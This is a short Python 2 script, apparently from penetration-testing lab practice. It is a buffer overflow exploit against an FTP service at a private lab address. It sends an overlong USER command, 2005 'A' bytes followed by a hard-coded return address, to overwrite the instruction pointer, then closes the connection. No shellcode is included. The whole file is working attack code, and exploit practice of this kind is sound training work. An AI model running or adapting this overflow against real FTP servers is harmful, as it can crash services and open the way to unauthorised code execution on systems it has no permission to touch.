#!/usr/bin/python
import sys
import socket

# 76cd5d33 = \x33\x5d\xcd\x76
crash = "A" * 2005 + "\x33\x5d\xcd\x76"

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',21))
	s.recv(1024)
	message='USER ' + crash + '\r\n'
	s.send(message)
	s.send('QUIT\r\n')
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 